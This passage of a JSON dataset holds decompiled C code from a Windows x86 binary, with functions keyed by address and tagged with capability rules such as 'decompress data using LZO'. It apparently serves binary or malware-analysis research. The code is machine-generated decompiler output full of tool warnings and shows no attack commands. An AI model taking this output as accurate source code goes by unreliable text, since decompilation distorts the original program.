puVar23 + 1;\n                    puVar24 = puVar24 + 1;\n                    puVar16 = piVar8;\n                    if (puVar24 == var_20h) goto code_r0x00439fe9;\n                }\n                uVar5 = *var_24h;\n                *piVar8 = cVar3;\n                pcVar1 = *(uVar5 + 8);\n                piVar15 = piVar8 + -1;\n                piVar8[-1] = 0x439fbd;\n                cVar3 = (*pcVar1)();\n                piVar8 = piVar15 + -4;\n                puVar16 = piVar15 + -4;\n                if (cVar3 == var_1ch) goto code_r0x00439fd8;\n                puVar24 = puVar24 + 1;\n                piVar8 = piVar15 + -4;\n            } while (puVar24 != var_20h);\ncode_r0x00439fe9:\n            puVar24 = NULL;\n            var_40h = NULL;\n            if (puVar23 != NULL) {\n                if (var_34h[2] < var_34h[3]) {\n                    var_34h[2] = var_34h[2] + 1;\n                    puVar22 = puVar16;\n                }\n                else {\n                    pcVar1 = *(*var_34h + 0x28);\n                    puVar22 = puVar16 + -4;\n                    *(puVar16 + -4) = 0x43a1c9;\n                    (*pcVar1)();\n                }\n                *(puVar22 + -4) = 0x43a021;\n                iVar4 = fcn.00418950();\n                puVar10 = var_28h;\n                puVar24 = NULL;\n                iVar4 = -iVar4;\n                puVar16 = puVar22 + iVar4;\n                var_1ch = puVar23;\n                var_40h = puVar22 + iVar4 + 0x13 & 0xfffffff0;\n                var_20h = puVar22 + iVar4 + 0x13 & 0xfffffff0;\n                do {\n                    *(puVar22 + iVar4) = *(arg_1ch + puVar10[puVar24] * 4);\n                    *(puVar22 + iVar4 + -4) = 0x43a04e;\n                    uVar6 = sub.msvcrt.dll_strlen();\n                    var_20h[puVar24] = uVar6;\n                    puVar24 = puVar24 + 1;\n                } while (var_1ch != puVar24);\n                var_38h = 0xffffffff;\n                puVar24 = 0x1;\n                puVar23 = var_1ch;\n            }\n        }\n    }\n    do {\n        var_20h._0_1_ = var_38h == 0xffffffff;\n        bVar2 = var_34h != NULL && var_20h;\n        uVar5 = var_1ch & 0xffffff00;\n        var_1ch = uVar5 | bVar2;\n        if (bVar2) {\n            if (var_34h[2] < var_34h[3]) {\n                var_1ch = uVar5;\n            }\n            else {\n                var_20h = var_20h & 0xffffff00 | var_20h;\n                pcVar1 = *(*var_34h + 0x24);\n                puVar17 = puVar16 + -4;\n                puVar16 = puVar16 + -4;\n                *puVar17 = 0x43a0d1;\n                iVar4 = (*pcVar1)();\n                piVar8 = NULL;\n                if (iVar4 != -1) {\n                    var_1ch._0_1_ = 0;\n                    piVar8 = var_34h;\n                }\n                var_34h = piVar8;\n                var_1ch = var_1ch & 0xffffff00 | var_1ch;\n            }\n        }\n        else {\n            var_1ch = uVar5 | var_20h;\n        }\n        uVar12 = var_3ch != NULL & var_2eh;\n        uVar13 = var_2eh;\n        if (uVar12 == 0) {\ncode_r0x00439e02:\n            if (uVar13 == var_1ch) break;\n        }\n        else {\n            if (var_3ch[3] <= var_3ch[2]) {\n                var_20h = var_20h & 0xffffff00 | var_20h;\n                pcVar1 = *(*var_3ch + 0x24);\n                puVar18 = puVar16 + -4;\n                puVar16 = puVar16 + -4;\n                *puVar18 = 0x43a0ff;\n                iVar4 = (*pcVar1)();\n                piVar8 = NULL;\n                if (iVar4 != -1) {\n                    uVar12 = 0;\n                    piVar8 = var_3ch;\n                }\n                var_3ch = piVar8;\n                uVar13 = uVar12;\n                goto code_r0x00439e02;\n            }\n            if (var_1ch == '\\0') break;\n        }\n        if ((var_34h == NULL) || (var_20h == 0)) {\n            var_2eh._1_1_ = var_38h;\n        }\n        else if (var_34h[2] < var_34h[3]) {\n            var_2eh._1_1_ = *var_34h[2];\n        }\n        else {\n            pcVar1 = *(*var_34h + 0x24);\n            puVar19 = puVar16 + -4;\n            puVar16 = puVar16 + -4;\n            *puVar19 = 0x43a129;\n            iVar7 = (*pcVar1)();\n            iVar4 = -1;\n            if (iVar7 != -1) {\n                iVar4 = iVar7;\n            }\n            piVar8 = NULL;\n            if (iVar7 != -1) {\n                piVar8 = var_34h;\n            }\n            var_2eh._1_1_ = iVar4;\n            var_34h = piVar8;\n        }\n        if (puVar23 == NULL) goto code_r0x00439eeb;\n        puVar11 = NULL;\n        var_1ch = puVar24;\n        stack0xffffffd0 = NULL;\n        var_20h = var_40h;\n        do {\n            while( true ) {\n                puVar10 = var_40h + puVar11;\n                if (puVar24 <= *puVar10 && *puVar10 != puVar24) break;\n                stack0xffffffd0 = stack0xffffffd0 + 1;\ncode_r0x00439e47:\n                puVar11 = puVar11 + 1;\n                if (puVar23 <= puVar11) goto code_r0x00439e92;\n            }\n            var_24h = var_28h + puVar11;\n            if (*(*(arg_1ch + *var_24h * 4) + puVar24) == var_2eh._1_1_) goto code_r0x00439e47;\n            puVar23 = puVar23 + -1;\n            *var_24h = var_28h[puVar23];\n            *puVar10 = var_40h[puVar23];\n        } while (puVar11 < puVar23);\ncode_r0x00439e92:\n        if (stack0xffffffd0 == puVar23) break;\n        if (var_34h[2] < var_34h[3]) {\n            var_34h[2] = var_34h[2] + 1;\n        }\n        else {\n            pcVar1 = *(*var_34h + 0x28);\n            puVar14 = puVar16 + -4;\n            puVar16 = puVar16 + -4;\n            *puVar14 = 0x439f48;\n            (*pcVar1)();\n        }\n        puVar24 = puVar24 + 1;\n        var_38h = 0xffffffff;\n    } while( true );\n    if (puVar23 == 0x1) {\n        var_40h = *var_40h;\n    }\n    else {\n        if (puVar23 != 0x2) goto code_r0x00439eeb;\n        if (*var_40h == puVar24) goto code_r0x00439f5e;\n        var_40h = var_40h[1];\n    }\n    if (var_40h == puVar24) {\ncode_r0x00439f5e:\n        uVar5 = *var_28h;\n        if (arg_20h <= uVar5) {\n            uVar5 = uVar5 - arg_20h;\n        }\n        *arg_18h = uVar5;\n        return CONCAT44(var_38h, var_34h);\n    }\ncode_r0x00439eeb:\n    *arg_28h = *arg_28h | 4;\n    return CONCAT44(var_38h, var_34h);\n}\n",
        "token_count": 3487
    },
    "0043b730": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.0043b730(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    bool bVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    int32_t *piVar13;\n    uint *puVar14;\n    int32_t *piVar15;\n    uint *puVar17;\n    uint *puVar18;\n    int32_t *piVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint uStack68;\n    int32_t aiStack64 [5];\n    uchar uStack41;\n    uint32_t var_24h;\n    uint32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    uint *puVar16;\n    \n    aiStack64[1] = arg_24h + 0x6c;\n    aiStack64[0] = 0x43b747;\n    var_1ch = fcn.004a0ae0();\n    aiStack64[0] = 0x43b75f;\n    iVar7 = fcn.00418950();\n    iVar7 = -iVar7;\n    *(&stack0xffffffc4 + iVar7) = &fcn.0043b730::arg_10h;\n    *(&stack0xffffffc0 + iVar7) = 0x43b776;\n    cVar2 = fcn.00430e20();\n    uVar5 = arg_ch;\n    if (cVar2 == '\\0') {\n        *(&stack0xffffffbc + iVar7) = 0x43b79f;\n        uVar4 = fcn.00430f10();\n        if (arg_20h != 0) {\n            var_20h = &stack0xffffffd7 + iVar7 & 0xfffffff0;\n            uVar20 = 0;\n            uVar21 = 0;\n            iVar9 = arg_1ch;\n            puVar12 = &stack0xffffffc0 + iVar7;\n            do {\n                while (uVar5 = **(iVar9 + uVar20 * 4),  uVar5 == uVar4) {\ncode_r0x0043b7e2:\n                    var_20h[uVar21] = uVar20;\n                    uVar21 = uVar21 + 1;\n                    uVar20 = uVar20 + 1;\n                    piVar15 = puVar12;\n                    if (arg_20h == uVar20) goto code_r0x0043b7f3;\n                }\n                iVar7 = *var_1ch;\n                *puVar12 = uVar5;\n                pcVar1 = *(iVar7 + 0x18);\n                puVar11 = puVar12 + -1;\n                puVar12[-1] = 0x43b7c4;\n                arg_1ch = iVar9;\n                uVar5 = (*pcVar1)();\n                puVar12 = puVar11 + -4;\n                piVar15 = puVar11 + -4;\n                iVar9 = arg_1ch;\n                if (uVar4 == uVar5) goto code_r0x0043b7e2;\n                uVar20 = uVar20 + 1;\n                puVar12 = puVar11 + -4;\n            } while (arg_20h != uVar20);\ncode_r0x0043b7f3:\n            puVar12 = var_20h;\n            var_20h = NULL;\n            if (1 < uVar21) {\ncode_r0x0043b810:\n                var_24h = *puVar12;\n                *piVar15 = *(arg_1ch + *puVar12 * 4);\n                piVar15[-1] = 0x43b825;\n                uVar20 = sub.msvcrt.dll_wcslen();\n                var_1ch = uVar21;\n                uVar10 = 1;\n                do {\n                    *piVar15 = *(arg_1ch + puVar12[uVar10] * 4);\n                    piVar15[-1] = 0x43b842;\n                    uVar8 = sub.msvcrt.dll_wcslen();\n                    uVar21 = var_1ch;\n                    if (uVar8 < uVar20) {\n                        uVar20 = uVar8;\n                    }\n                    uVar10 = uVar10 + 1;\n                } while (uVar10 < var_1ch);\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    pcVar1 = *(*arg_8h + 0x28);\n                    puVar16 = piVar15 + -1;\n                    piVar15 = piVar15 + -1;\n                    *puVar16 = 0x43ba45;\n                    (*pcVar1)();\n                }\n                var_20h = var_20h + 1;\n                arg_ch._0_2_ = 0xffff;\n                uVar5 = 0xffff;\n                if (var_20h < uVar20) {\n                    cVar2 = '\\x01';\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar6 = *arg_8h[2];\n                        }\n                        else {\n                            pcVar1 = *(*arg_8h + 0x24);\n                            puVar18 = piVar15 + -4;\n                            piVar15 = piVar15 + -4;\n                            *puVar18 = 0x43ba67;\n                            iVar6 = (*pcVar1)();\n                        }\n                        cVar2 = '\\0';\n                        if (iVar6 == -1) {\n                            arg_8h = NULL;\n                            cVar2 = '\\x01';\n                        }\n                    }\n                    var_1ch._0_1_ = arg_14h == -1;\n                    bVar3 = arg_10h != NULL && var_1ch;\n                    var_1ch = var_1ch & 0xffffff00 | bVar3;\n                    if (bVar3) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar6 = *arg_10h[2];\n                        }\n                        else {\n                            pcVar1 = *(*arg_10h + 0x24);\n                            puVar17 = piVar15 + -4;\n                            piVar15 = piVar15 + -4;\n                            *puVar17 = 0x43ba60;\n                            iVar6 = (*pcVar1)();\n                        }\n                        var_1ch._0_1_ = '\\0';\n                        if (iVar6 == -1) {\n                            arg_10h = NULL;\n                        }\n                    }\n                    uVar5 = 0xffff;\n                    if (var_1ch != cVar2) {\n                        uVar10 = 0;\n                        var_1ch = var_20h * 2;\n                        uVar20 = var_24h;\n                        do {\n                            uVar5 = *(*(arg_1ch + uVar20 * 4) + var_1ch);\n                            uVar4 = arg_ch;\n                            if (arg_8h != NULL) {\n                                if (arg_8h[2] < arg_8h[3]) {\n                                    uVar4 = *arg_8h[2];\n                                }\n                                else {\n                                    var_24h = uVar5;\n                                    pcVar1 = *(*arg_8h + 0x24);\n                                    puVar14 = piVar15 + -4;\n                                    piVar15 = piVar15 + -4;\n                                    *puVar14 = 0x43ba38;\n                                    uVar4 = (*pcVar1)();\n                                    uVar5 = var_24h;\n                                }\n                                if (uVar4 == 0xffff) {\n                                    arg_8h = NULL;\n                                }\n                            }\n                            if (uVar5 == uVar4) {\n                                uVar10 = uVar10 + 1;\n                                if (uVar21 <= uVar10) goto code_r0x0043b91e;\n                            }\n                            else {\n                                uVar21 = uVar21 - 1;\n                                puVar12[uVar10] = puVar12[uVar21];\n                                if (uVar21 <= uVar10) goto code_r0x0043b91e;\n                            }\n                            uVar20 = puVar12[uVar10];\n                        } while( true );\n                    }\n                }\n                goto code_r0x0043b77d;\n            }\ncode_r0x0043b927:\n            uVar5 = arg_ch;\n            if (uVar21 == 1) {\n                piVar15[-1] = 0x43b938;\n                fcn.004867f0();\n                uVar21 = var_20h;\n                iVar7 = *(arg_1ch + *puVar12 * 4);\n                var_1ch = *puVar12;\n                *piVar15 = iVar7;\n                piVar15[-1] = 0x43b95a;\n                uVar20 = sub.msvcrt.dll_wcslen();\n                while (uVar21 = uVar21 + 1,  uVar21 < uVar20) {\n                    arg_ch._0_2_ = 0xffff;\n                    uVar5 = 0xffff;\n                    *piVar15 = &fcn.0043b730::arg_10h;\n                    piVar15[-1] = 0x43b9a5;\n                    cVar2 = fcn.00430e20();\n                    piVar19 = piVar15 + -1;\n                    if (cVar2 != '\\0') goto code_r0x0043b77d;\n                    uVar4 = *(iVar7 + uVar21 * 2);\n                    piVar13 = piVar15 + -1;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            arg_ch._0_2_ = *arg_8h[2];\n                        }\n                        else {\n                            var_20h = uVar4;\n                            pcVar1 = *(*arg_8h + 0x24);\n                            piVar19 = piVar15 + -2;\n                            piVar15[-2] = 0x43ba93;\n                            arg_ch._0_2_ = (*pcVar1)();\n                            uVar4 = var_20h;\n                        }\n                        piVar13 = piVar19;\n                        if (arg_ch == 0xffff) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    uVar5 = 0xffff;\n                    if (uVar4 != arg_ch) goto code_r0x0043b77d;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        arg_8h[2] = arg_8h[2] + 2;\n                        piVar15 = piVar13;\n                    }\n                    else {\n                        pcVar1 = *(*arg_8h + 0x28);\n                        piVar15 = piVar13 + -1;\n                        piVar13[-1] = 0x43ba71;\n                        (*pcVar1)();\n                    }\n                }\n                uVar5 = 0xffff;\n                if (uVar21 == uVar20) {\n                    *arg_18h = var_1ch;\n                    goto code_r0x0043b783;\n                }\n            }\n        }\n    }\ncode_r0x0043b77d:\n    *arg_28h = *arg_28h | 4;\ncode_r0x0043b783:\n    return CONCAT24(uVar5, arg_8h);\ncode_r0x0043b91e:\n    if (uVar21 < 2) goto code_r0x0043b927;\n    goto code_r0x0043b810;\n}\n",
        "token_count": 2765
    },
    "0043d250": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0043d250(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    uint16_t uVar5;\n    int16_t iVar6;\n    uint16_t uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uint32_t *puVar10;\n    bool bVar11;\n    uint8_t uVar12;\n    uint32_t uVar13;\n    uint *puVar14;\n    uint32_t *puVar15;\n    uint *puVar16;\n    uint *puVar17;\n    uint *puVar18;\n    uchar *puVar19;\n    uchar *puVar20;\n    uint *puVar22;\n    uchar *puVar23;\n    uint32_t *puVar24;\n    uint32_t *puVar25;\n    bool bVar26;\n    uint uStack96;\n    int32_t iStack92;\n    uchar uStack73;\n    uint var_44h;\n    int32_t *var_40h;\n    int32_t var_39h;\n    int32_t *var_34h;\n    uint var_30h;\n    uint32_t *var_2ch;\n    uint32_t *var_28h;\n    uint32_t *var_24h;\n    uint32_t *var_20h;\n    uint32_t *var_1ch;\n    uint var_ch;\n    uint *puVar21;\n    \n    var_34h = arg_8h;\n    iStack92 = arg_24h + 0x6c;\n    var_44h = arg_ch;\n    uVar7 = arg_ch;\n    var_40h = arg_10h;\n    uStack96 = 0x43d280;\n    var_30h._0_2_ = uVar7;\n    var_1ch = fcn.004a0ae0();\n    uStack96 = 0x43d298;\n    iVar8 = fcn.00418950();\n    iVar8 = -iVar8;\n    puVar19 = &stack0xffffffa4 + iVar8;\n    var_24h = &stack0xffffffb7 + iVar8 & 0xfffffff0;\n    bVar11 = var_34h != NULL && uVar7 == 0xffff;\n    puVar20 = &stack0xffffffa4 + iVar8;\n    var_20h._0_1_ = uVar7 == 0xffff;\n    bVar4 = bVar11;\n    if (bVar11) {\n        if (var_34h[2] < var_34h[3]) {\n            iVar6 = *var_34h[2];\n        }\n        else {\n            pcVar2 = *(*var_34h + 0x24);\n            puVar19 = &stack0xffffffa0 + iVar8;\n            *(&stack0xffffffa0 + iVar8) = 0x43d6cd;\n            iVar6 = (*pcVar2)();\n        }\n        puVar20 = puVar19;\n        var_20h._0_1_ = false;\n        if (iVar6 == -1) {\n            var_34h = NULL;\n            bVar4 = false;\n            var_20h._0_1_ = bVar11;\n        }\n    }\n    bVar26 = arg_14h == -1;\n    var_39h._0_1_ = bVar26;\n    bVar11 = arg_10h != NULL && bVar26;\n    if (bVar11) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar6 = *arg_10h[2];\n        }\n        else {\n            var_20h = var_20h & 0xffffff00 | var_20h;\n            pcVar2 = *(*arg_10h + 0x24);\n            puVar21 = puVar20 + -4;\n            puVar20 = puVar20 + -4;\n            *puVar21 = 0x43d6dc;\n            iVar6 = (*pcVar2)();\n        }\n        var_40h = NULL;\n        if (iVar6 != -1) {\n            var_40h = arg_10h;\n        }\n        bVar26 = iVar6 == -1 && bVar11;\n    }\n    if (bVar26 == var_20h) {\n        var_20h = NULL;\n        puVar24 = NULL;\n        puVar25 = NULL;\n    }\n    else {\n        uVar7 = var_30h;\n        if (bVar4) {\n            if (var_34h[2] < var_34h[3]) {\n                uVar7 = *var_34h[2];\n            }\n            else {\n                pcVar2 = *(*var_34h + 0x24);\n                puVar22 = puVar20 + -4;\n                puVar20 = puVar20 + -4;\n                *puVar22 = 0x43d6ed;\n                uVar7 = (*pcVar2)();\n            }\n            piVar9 = NULL;\n            if (uVar7 != 0xffff) {\n                piVar9 = var_34h;\n            }\n            var_34h = piVar9;\n        }\n        var_20h = arg_20h * 2;\n        if (arg_20h * 2 == 0) {\n            puVar25 = NULL;\n            puVar24 = NULL;\n        }\n        else {\n            uVar13 = 0;\n            puVar25 = NULL;\n            puVar24 = puVar20;\n            do {\n                while (uVar5 = **(arg_1ch + uVar13 * 4),  uVar5 == uVar7) {\ncode_r0x0043d563:\n                    var_24h[puVar25] = uVar13;\n                    puVar25 = puVar25 + 1;\n                    uVar13 = uVar13 + 1;\n                    puVar20 = puVar24;\n                    if (uVar13 == var_20h) goto code_r0x0043d574;\n                }\n                uVar3 = *var_1ch;\n                *puVar24 = uVar5;\n                pcVar2 = *(uVar3 + 0x18);\n                puVar15 = puVar24 + -1;\n                puVar24[-1] = 0x43d545;\n                uVar5 = (*pcVar2)();\n                puVar24 = puVar15 + -4;\n                puVar20 = puVar15 + -4;\n                if (uVar5 == uVar7) goto code_r0x0043d563;\n                uVar13 = uVar13 + 1;\n                puVar24 = puVar15 + -4;\n            } while (uVar13 != var_20h);\ncode_r0x0043d574:\n            var_20h = NULL;\n            puVar24 = NULL;\n            if (puVar25 != NULL) {\n                if (var_34h[2] < var_34h[3]) {\n                    var_34h[2] = var_34h[2] + 2;\n                    puVar23 = puVar20;\n                }\n                else {\n                    pcVar2 = *(*var_34h + 0x28);\n                    puVar23 = puVar20 + -4;\n                    *(puVar20 + -4) = 0x43d6f9;\n                    (*pcVar2)();\n                }\n                *(puVar23 + -4) = 0x43d5ac;\n                iVar8 = fcn.00418950();\n                puVar24 = var_24h;\n                iVar8 = -iVar8;\n                puVar20 = puVar23 + iVar8;\n                var_1ch = puVar25;\n                var_20h = puVar23 + iVar8 + 0x13 & 0xfffffff0;\n                var_28h = puVar23 + iVar8 + 0x13 & 0xfffffff0;\n                puVar25 = NULL;\n                do {\n                    *(puVar23 + iVar8) = *(arg_1ch + puVar24[puVar25] * 4);\n                    *(puVar23 + iVar8 + -4) = 0x43d5de;\n                    uVar13 = sub.msvcrt.dll_wcslen();\n                    var_20h[puVar25] = uVar13;\n                    puVar25 = puVar25 + 1;\n                } while (var_1ch != puVar25);\n                var_20h = 0x1;\n                var_30h._0_2_ = 0xffff;\n                puVar24 = var_28h;\n                puVar25 = var_1ch;\n            }\n        }\n    }\n    do {\n        var_28h._0_1_ = var_30h == 0xffff;\n        var_1ch = var_1ch & 0xffffff00 | var_28h;\n        bVar11 = var_34h != NULL && var_28h;\n        if (bVar11) {\n            if (var_34h[2] < var_34h[3]) {\n                iVar6 = *var_34h[2];\n                var_28h._0_1_ = bVar11;\n            }\n            else {\n                var_28h = var_28h & 0xffffff00 | bVar11;\n                pcVar2 = *(*var_34h + 0x24);\n                puVar16 = puVar20 + -4;\n                puVar20 = puVar20 + -4;\n                *puVar16 = 0x43d66b;\n                iVar6 = (*pcVar2)();\n            }\n            piVar9 = NULL;\n            if (iVar6 != -1) {\n                var_28h._0_1_ = 0;\n                piVar9 = var_34h;\n            }\n            var_34h = piVar9;\n        }\n        uVar12 = var_40h != NULL & var_39h;\n        if (uVar12 == 0) {\n            if (var_28h == var_39h) break;\n        }\n        else {\n            if (var_40h[2] < var_40h[3]) {\n                iVar6 = *var_40h[2];\n            }\n            else {\n                var_28h = var_28h & 0xffffff00 | var_28h;\n                pcVar2 = *(*var_40h + 0x24);\n                puVar17 = puVar20 + -4;\n                puVar20 = puVar20 + -4;\n                *puVar17 = 0x43d67f;\n                iVar6 = (*pcVar2)();\n            }\n            piVar9 = NULL;\n            if (iVar6 != -1) {\n                uVar12 = 0;\n                piVar9 = var_40h;\n            }\n            var_40h = piVar9;\n            if (var_28h == uVar12) break;\n        }\n        if ((var_34h == NULL) || (var_1ch == '\\0')) {\n            var_30h._2_2_ = var_30h;\n        }\n        else {\n            if (var_34h[2] < var_34h[3]) {\n                var_30h._2_2_ = *var_34h[2];\n            }\n            else {\n                pcVar2 = *(*var_34h + 0x24);\n                puVar18 = puVar20 + -4;\n                puVar20 = puVar20 + -4;\n                *puVar18 = 0x43d690;\n                var_30h._2_2_ = (*pcVar2)();\n            }\n            piVar9 = NULL;\n            if (var_30h._2_2_ != 0xffff) {\n                piVar9 = var_34h;\n            }\n            var_34h = piVar9;\n        }\n        if (puVar25 == NULL) goto code_r0x0043d450;\n        puVar10 = NULL;\n        var_1ch = puVar24;\n        puVar24 = var_1ch;\n        var_2ch = NULL;\n        stack0xffffffc4 = var_20h * 2;\n        do {\n            while (puVar1 = puVar24 + puVar10,  *puVar1 < var_20h || *puVar1 == var_20h) {\n                var_2ch = var_2ch + 1;\ncode_r0x0043d36a:\n                puVar10 = puVar10 + 1;\n                if (puVar25 <= puVar10) goto code_r0x0043d3b9;\n            }\n            var_28h = var_24h + puVar10;\n            if (*(*(arg_1ch + *var_28h * 4) + var_20h * 2) == var_30h._2_2_) goto code_r0x0043d36a;\n            puVar25 = puVar25 + -1;\n            *var_28h = var_24h[puVar25];\n            *puVar1 = puVar24[puVar25];\n        } while (puVar10 < puVar25);\ncode_r0x0043d3b9:\n        if (var_2ch == puVar25) break;\n        if (var_34h[2] < var_34h[3]) {\n            var_34h[2] = var_34h[2] + 2;\n        }\n        else {\n            pcVar2 = *(*var_34h + 0x28);\n            puVar14 = puVar20 + -4;\n            puVar20 = puVar20 + -4;\n            *puVar14 = 0x43d4d8;\n            (*pcVar2)();\n        }\n        var_20h = var_20h + 1;\n        var_30h._0_2_ = 0xffff;\n    } while( true );\n    if (puVar25 == 0x1) {\n        uVar13 = *puVar24;\njoined_r0x0043d4f0:\n        if (uVar13 == var_20h) {\ncode_r0x0043d4f6:\n            uVar13 = *var_24h;\n            if (arg_20h <= uVar13) {\n                uVar13 = uVar13 - arg_20h;\n            }\n            *arg_18h = uVar13;\n            goto code_r0x0043d456;\n        }\n    }\n    else if (puVar25 == 0x2) {\n        if (*puVar24 != var_20h) {\n            uVar13 = puVar24[1];\n            goto joined_r0x0043d4f0;\n        }\n        goto code_r0x0043d4f6;\n    }\ncode_r0x0043d450:\n    *arg_28h = *arg_28h | 4;\ncode_r0x0043d456:\n    var_44h = CONCAT22(var_44h._2_2_, var_30h);\n    return CONCAT44(var_44h, var_34h);\n}\n",
        "token_count": 3443
    },
    "0043e270": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffb0 : 0x0043e330\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0043ec27)\n// WARNING: Removing unreachable block (ram,0x0043e3de)\n// WARNING: Removing unreachable block (ram,0x0043e3e8)\n// WARNING: Removing unreachable block (ram,0x0043e3f2)\n// WARNING: Removing unreachable block (ram,0x0043eb00)\n// WARNING: Removing unreachable block (ram,0x0043eea8)\n// WARNING: Removing unreachable block (ram,0x0043eeb6)\n// WARNING: Removing unreachable block (ram,0x0043e3fb)\n// WARNING: Removing unreachable block (ram,0x0043e407)\n// WARNING: Removing unreachable block (ram,0x0043ebb0)\n// WARNING: Removing unreachable block (ram,0x0043eb0c)\n// WARNING: Removing unreachable block (ram,0x0043eb1b)\n// WARNING: Removing unreachable block (ram,0x0043e416)\n// WARNING: Removing unreachable block (ram,0x0043e41c)\n// WARNING: Removing unreachable block (ram,0x0043e380)\n// WARNING: Removing unreachable block (ram,0x0043e38a)\n// WARNING: Removing unreachable block (ram,0x0043e9e0)\n// WARNING: Removing unreachable block (ram,0x0043e38d)\n// WARNING: Removing unreachable block (ram,0x0043e3a0)\n// WARNING: Removing unreachable block (ram,0x0043ead0)\n// WARNING: Removing unreachable block (ram,0x0043eade)\n// WARNING: Removing unreachable block (ram,0x0043eaec)\n// WARNING: Removing unreachable block (ram,0x0043e3ba)\n// WARNING: Removing unreachable block (ram,0x0043e3c8)\n// WARNING: Removing unreachable block (ram,0x0043e3d0)\n// WARNING: Removing unreachable block (ram,0x0043e9b1)\n// WARNING: Removing unreachable block (ram,0x0043e9bd)\n// WARNING: Removing unreachable block (ram,0x0043e9d3)\n// WARNING: Removing unreachable block (ram,0x0043e3d2)\n// WARNING: Removing unreachable block (ram,0x0043ebc0)\n// WARNING: Removing unreachable block (ram,0x0043ebcc)\n// WARNING: Removing unreachable block (ram,0x0043ebdc)\n// WARNING: Removing unreachable block (ram,0x0043ebe4)\n// WARNING: Removing unreachable block (ram,0x0043ec5e)\n// WARNING: Removing unreachable block (ram,0x0043e8b1)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.0043e270(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    ulong uVar7;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6bh;\n    uint s;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    arg_8h_00 = arg_18h + 0x6c;\n    fcn.004a0a80(arg_8h_00);\n    iVar3 = fcn.00432500();\n    piVar1 = *(*(arg_18h + 0x6c) + 0xc) + iVar3 * 4;\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        puVar5 = fcn.004a3500(0x44);\n        *puVar5 = 0x50af14;\n        puVar5[1] = 0;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x12) = 0;\n        puVar5[5] = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        puVar5[0xb] = 0;\n        puVar5[0xc] = 0;\n        puVar5[0xd] = 0;\n        *(puVar5 + 0x43) = 0;\n        fcn.0048a350(arg_8h_00);\n        fcn.0048da50(puVar5, iVar3);\n        iVar6 = *piVar1;\n    }\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h._0_1_ = 0;\n    if (*(iVar6 + 0x10) != '\\0') {\n        fcn.004924e0(0x20);\n    }\n    var_30h = &var_28h;\n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    fcn.004924e0(0x20);\n    var_70h = 1;\n    var_4ch = *(iVar6 + 0x34);\n    puVar5 = &var_4ch;\n    while( true ) {\n        if (var_4ch < 5) {\n    // WARNING: Could not recover jumptable at 0x0043e358. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x5027a0\n            uVar7 = (**(*puVar5 * 4 + 0x5027a0))();\n            return uVar7;\n        }\n        if (3 < var_70h) break;\n        puVar5 = &var_4ch + var_70h;\n        var_4ch._0_1_ = *puVar5;\n        var_70h = var_70h + 1;\n    }\n    if ((var_2ch < 2) || (uVar4 = fcn.004354f0(0x30, 0),  uVar4 == 0)) goto code_r0x0043ebd6;\n    if (uVar4 == 0xffffffff) {\n        uVar4 = var_2ch - 1;\n        if (uVar4 == 0xffffffff) {\n            *var_30h = 0;\n            goto code_r0x0043ebd6;\n        }\n        if (uVar4 == 0) goto 